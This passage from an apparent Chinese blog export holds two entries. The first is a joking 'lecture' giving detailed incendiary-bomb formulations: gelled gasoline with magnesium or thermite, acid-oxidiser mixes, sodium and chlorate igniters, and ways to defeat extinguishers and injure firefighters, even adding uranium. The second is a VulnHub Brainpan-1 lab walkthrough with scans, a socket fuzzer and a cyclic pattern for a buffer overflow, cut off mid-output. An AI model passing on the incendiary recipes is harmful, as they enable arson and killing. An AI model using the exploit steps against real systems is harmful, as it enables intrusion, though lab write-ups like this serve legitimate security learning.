<p>　　最后推荐的是比较有艺术气息的用品了，请我们缪斯女神的化身－－tnt登场！！（闪光灯唰唰，掌声如雷）！可能您会有疑问，tnt如何和艺术挂钩呢？这取决于它的一个性质，在摄氏大概185度左右，它会熔化。到时候可以浇铸成任何形状。您想必也知道可以用石膏和腊作人像等，但是您有没有想过用tnt那么前卫的材料作艺术品呢？到时候您大可以向中央美术学院借几个维纳斯的模子。浇铸一个tnt维纳斯！如果喜欢也可以铸大卫。那将无论如何是后现代艺术的杰作，哈哈哈哈。</p>
<p>　　上一讲我们讲了一些特种爆破炸弹的制作方法，现在让我们把眼睛从炸弹上移开，把注意力调整到燃烧弹上来。有人说“学习二战找个啤酒瓶子装上汽油，塞个布头，用火机一点，轰！整个世界就平静了！”（俗称莫罗托夫鸡尾酒）。不客气地说一句，如果用文明史来打比方的话，这也就处于周口店的水平。我这篇文章好歹进步到文艺复兴了，至于说什么电气化，信息化，我们还差得远呢。古人曰，学无止境，难道在这么个水平你就满足了？那可真是缺乏进取心。另外，燃烧弹是不会有轰的声音的，最多就是玻璃瓶子碎掉的呯。好了，书归正转，开讲。</p>
<p>同学们好！（老师好！）</p>
<p>　　要讲讲如何制作性能优良，质量上乘的燃烧弹，首先要弄清楚几个概念，怎样才是一个性能优良的燃烧弹。燃烧值高，燃烧温度高固然是一个重要方面，还有更重要的包括燃烧速度，和抗灭火能力，以及必要的附加性质和杀伤能力等等。</p>
<p>　　无论从哪个角度说，单纯使用汽油作的燃烧弹都是三流中的三流货色。从前段时间某些自焚人士的实践表明，在一个消防体系完备的环境中，纯汽油根本无法起到高效的杀伤作用。</p>
<p>　　汽油的燃烧值是无需怀疑的，但是燃烧值高并不意味着燃烧温度就高。大家可能知道，大部分所谓易燃物质如酒精等都不能在液态下直接燃烧，我们所点燃的都是挥发到空气中的蒸汽，他们必须以气态才能够与氧气充分混合燃烧。燃烧的火焰提高温度加速液体挥发，燃烧才能进行。这一方面浪费了大量的气化热，一方面也限制了燃烧温度。其实很多江湖卖艺的都会做一种表演：将手泡到酒精中后取出点燃，可以看到手上的淡蓝色火焰，看似惊险其实没有什么奥秘，更不会对人体造成伤害，他们甚至能够感觉手上凉飕飕的，只要有胆量，大部分人都可以作。提高温度通常会在汽油中添加一些燃剂，就我个人而言可能是添加镁粉或者铝热剂，普通火焰温度是几百度，以这种添加剂可以达到一千度，一千五百度，高的可能接近两千度。不但加大杀伤力和引燃能力，也可以大大加快燃剂挥发速度。</p>
<p>　　除了提高温度，抗灭火能力也是极其重要的，很多人有一种根深蒂固的观念，火焰总是会被灭火器扑灭的，事实上，燃烧弹在灭火措施面前不仅不是任人宰割的，有的时候甚至能反客为主令灭火措施完全失效。最简单反灭火手段莫过于大大加快燃烧速度，在对方还没有来得及作出反应的时候就结束，或者把火势放大到不可收拾的地步。上面的镁粉就是一种，高温下汽油挥发燃烧速度起码加快两倍。其次就是抗灭火器了，目前比较广泛应用的是水，二氧化碳的泡沫灭火器，干粉灭火器等等。这些灭火器的工作原理是降温，隔绝空气中的氧气，和干扰火焰中的活性基团结合等等。这些都是可以避开的，首先是水，不能用水来灭油类火灾是常识，所以我们通常不会碰到，即使碰到了，不但加速火势蔓延，还可能因为镁在热水中生成氢氧化镁放出氢气，在爆炸极限浓度中甚至可以产生爆炸，我们求之不得。嘿嘿，接下来是二氧化碳灭火剂，那就更有意思了，不广为人所知的一件事情是，镁不仅能够在空气中燃烧，它还可以在二氧化碳中燃烧！放出大量的热然后变为氧化镁和碳，至于碳作用也不小，它是呈微粒的粉状，在有水情况下可能会产生水煤气，也就是一氧化碳和氢气的混合物，无水情况下也可以不完全燃烧成一氧化碳，或者回到老家去变成二氧化碳。总之即使燃烧 ，也可能产生有毒气体。最后是对付干粉灭火器，干粉灭火器的原理是产生大量小微粒以干粉形式喷到火焰上，干扰活性基团的结合，从而灭火。这就回到了燃烧的本质问题上来了，燃烧作为一种比较剧烈的氧化还原反应，空气中的氧气是比较常见的氧化剂，但绝对不是唯一的，必要时甚至可以自备氧化剂。通常的硝酸、硝酸钾和浓硫酸都是相当不错的，这样一来就彻底消除了以隔绝空气的灭火手段。</p>
<p>　　最后就是黏着能力的问题，很多时候我们的目标是倾斜或者垂直的平面，如果用汽油很可能会流光而无法达到效果，通常可以使用橡胶溶剂来调节粘稠度。做法是把橡胶（尽量选择天然的）切成小块，溶解到汽油中即可。</p>
<p>　　好了，现在出现了两种思路。第一种就是高温快速派的，方法是橡胶溶解汽油中添加碱液、镁粉、铝热剂、油脂、松香、蛋清、肥皂、石蜡和甚至动物血。这些材料的不是必要的，属于可选范围，比例和配方自定，它的特点是温度高，粘着性很强，燃烧迅速。还有炽热的铁水和镁氧化辅助。基本上无法扑灭也来不及扑灭。性质与军方使用的胶凝汽油差不多。引燃系统我推荐是把一两块干净的钠用薄的药棉裹好贴在瓶子表面，这样一来，一旦瓶子被扔出破裂，钠和瓶内的一些水份及有机物接触，就会发生反应放热和氢气，点燃燃烧弹。千万不要和我谈什么拿打火机点布条之类的手段，传出去都不好意思见人。</p>
<p>　　另一种思路则是，同样是橡胶汽油，但是添加的是浓硫酸、硝酸钾、木工的锯末和少量研碎石蜡，这里要注意的是，浓硫酸占的体积分数可以到10%左右。它的特点是自带氧化剂，所以可以抗许多灭火器材，甚至还有一定的爆炸能力。扑灭的可能性比前者还要低。基本碰上就是神仙也无救。引燃系统就比较多种多样了，前者的棉花裹钠仍然可以使用，其次就是在表面贴上一层在氯化钾、糖，混合溶液中浸泡过晾干的纸。瓶子一破，硫酸与这些成分接触就会燃烧起来。好像还有一种就是在溶液中添加高锰酸钾，缺点是不稳定，容易走火。还有一点就是要尽量保证燃烧液中没有水分，因为有水分的话，浓硫酸会产生氢离子，使硝酸钾变为酸性，比较危险。</p>
<p>　　当然咯，以一个完美主义者的态度来看，两个燃烧弹合在一起是最好的，但是不能够直接混合，因为一个酸性一个碱性，如果可以的话，二个瓶子装捆在一起无疑是非常好的，基本就是无所畏惧的超级燃烧弹了。哈哈哈。</p>
<p>　　除这些以外，您也可以添加一些其他的东西，比如建筑上使用的松节油，油漆，其他的如塑料袋等，可以产生浓重的黑烟和刺激性气体和少量毒性，干扰灭火人。</p>
<p>　　最后再给您一个狠主意，如果您有一点点铀却又不足以到达临界质量制作原子弹的话，那么大可以添加到这里来，产生的高温足以将其液化甚至少量气化，除了杀伤救火人员之外，其下风方向会产生一定的核沾染，基本就属于灭绝人性的法子了。</p>
<p>　　最后向各位说明的是，制作炸弹也好，燃烧弹也罢，既不是高精尖科技，也不是一个捻子一个雷式的土法生产。他需要化学，物理，结构力学，材料力学，医学，甚至日常生活方面各种的知识。所有人包括我都仅仅处于学习，研究，探索过程中。欢迎各位有兴趣的同学一起来切磋。我们的口号是：“威力无极限！！！” </p>
]]></content>
      <categories>
        <category>制作</category>
      </categories>
      <tags>
        <tag>deep web</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-1]</title>
    <url>/2020/01/26/brainpan-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Brainpan：1<br>发布日期：2013年3月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXA=">https://download.vulnhub.com/brainpan/Brainpan.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9CcmFpbnBhbi56aXAudG9ycmVudA==">https://download.vulnhub.com/brainpan/Brainpan.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> _               _                         </span><br><span class="line">| |__  _ __ __ _(_)_ __  _ __   __ _ _ __  </span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |</span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|</span></span><br><span class="line"><span class="string">                        |_|                </span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，在任何情况下概不负责任何损失或损害，包括但不限于间接或随之而来的损失或损害，或任何损失或损害因使用引起的或与使用有关的数据或利润损失该软件。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan经过测试，发现可在以下虚拟机监控程序上工作：<br>-VMware Player 5.0.1<br>-VMWare Fusion 5.0<br>-VirtualBox 4.2.8<br>将Brainpan导入首选的虚拟机监控程序并配置网络根据需要进行设置。它会通过DHCP获取IP地址，但是建议在NAT内运行它，或者仅对主机操作系统可见，因为它容易受到攻击。</p>
<p>资料来源：Brainpan.zip/readme.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5（brainpan.ova）= fc0f163220b9884df5dcc9cdc45361e4</span><br></pre></td></tr></table></figure>
<p>资料来源：Brainpan.zip/md5.txtVulnHub独家！</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap扫一顿</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.115</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">MAC Address: 08:00:27:DE:BA:CA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -p- -v -Pn -sV 192.168.56.115</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<p>访问一下看看是什么东西:</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub188.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub189.jpg"></p>
<p>扫一下目录看看</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub190.jpg"></p>
<p>在bin目录中有一个二进制文件？</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub191.jpg"></p>
<p>将这个exe文件下载下来，然后用ollydbug工具调试</p>
<p>调试之前，先分析下brainpan.exe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># file brainpan.exe </span></span><br><span class="line">brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), <span class="keyword">for</span> MS Windows</span><br><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># strings brainpan.exe </span></span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">.text</span><br><span class="line">`.data</span><br><span class="line">.rdata</span><br><span class="line">@.bss</span><br><span class="line">.idata</span><br><span class="line">[^_]</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">AAAA</span><br><span class="line">[^_]</span><br><span class="line">[get_reply] s = [%s]</span><br><span class="line">[get_reply] copied %d bytes to buffer</span><br><span class="line">shitstorm</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line">                          &gt;&gt; </span><br><span class="line">                          ACCESS DENIED</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line">[+] initializing winsock...</span><br><span class="line">[!] winsock init failed: %d</span><br><span class="line"><span class="keyword">done</span>.</span><br><span class="line">[!] could not create socket: %d</span><br><span class="line">[+] server socket created.</span><br><span class="line">[!] <span class="built_in">bind</span> failed: %d</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port %d</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[+] check is %d</span><br><span class="line">[!] accept failed: %d</span><br><span class="line">[+] cleaning up.</span><br><span class="line">-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32</span><br><span class="line">w32_sharedptr-&gt;size == sizeof(W32_EH_SHARED)</span><br><span class="line">../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c</span><br><span class="line">GetAtomNameA (atom, s, sizeof(s)) != 0</span><br><span class="line">AddAtomA</span><br><span class="line">ExitProcess</span><br><span class="line">FindAtomA</span><br><span class="line">GetAtomNameA</span><br><span class="line">SetUnhandledExceptionFilter</span><br><span class="line">__getmainargs</span><br><span class="line">__p__environ</span><br><span class="line">__p__fmode</span><br><span class="line">__set_app_type</span><br><span class="line">_assert</span><br><span class="line">_cexit</span><br><span class="line">_iob</span><br><span class="line">_onexit</span><br><span class="line">_setmode</span><br><span class="line">abort</span><br><span class="line">atexit</span><br><span class="line">free</span><br><span class="line">malloc</span><br><span class="line">memset</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">signal</span><br><span class="line">strcmp</span><br><span class="line">strcpy</span><br><span class="line">strlen</span><br><span class="line">太多了省略。。。</span><br></pre></td></tr></table></figure>

<p>这里有几个很重要：</p>
<ul>
<li>这个brainpan.exe看起来与端口9999上的侦听过程相同</li>
<li>shitstorm 看起来像密码</li>
<li>strcpy 可能是缓冲区溢出攻击向量</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub192.jpg"></p>
<p>显然，应该尝试可能的密码shitstorm。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.115 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[________________________ WELCOME TO BRAINPAN _________________________]</span><br><span class="line">                          ENTER THE PASSWORD                              </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; shitstorm</span><br><span class="line">                          ACCESS GRANTED</span><br></pre></td></tr></table></figure>

<p>返回。<br>嗯…如何检查strcpy函数。<br>虽然有适用于Linux的Evan的Debugger和Immunity Debugger（通过wine执行），但我选择在Windows环境中将Immunity Debugger用于“windozy”类型的任务。</p>
<p>免责声明：对于那些已经知道如何执行简单的strcpy缓冲区溢出的人，可以快速进入下一节，因为这本身就很冗长且“用户友好”。选择为每个步骤包括大量的模糊测试代码和详细信息，以便对这种攻击媒介不熟悉的任何人都可以轻松学习并希望了解该过程。</p>
<p>是时候使用快速模糊器来看看是否可以获取导致段错误的输入。这是经常使用的一些代码，并在进行过程中使用shellcode和register进行修改。简单，有效。</p>
<p>etfuzz.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 1000</span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>是时候运行brainpan.exe并使用Immunity Debugger附加到进程。在Windows机器上侦听该进程的情况下，在端口9999上放置1000个模糊测试（\x41），看看是否遇到段错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub193.jpg"></p>
<p>AM！造成了我们想要的段错误，所见，已经成功地使用模糊A覆盖了eip。是时候控制自己，享受一些乐趣了。<br>下一步，需要多少字节来填充缓冲区以使eip？使用Metasploit的工具进行此活动。创建一个模式作为开始。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span><br></pre></td></tr></table></figure>

<p>将其添加到模糊测试脚本etfuzz.py中，用模式输出替换掉A的垃圾数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>下一步。重新启动brainpan.exe进程，重新附加到进程，然后将模糊测试脚本发送给侦听器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3A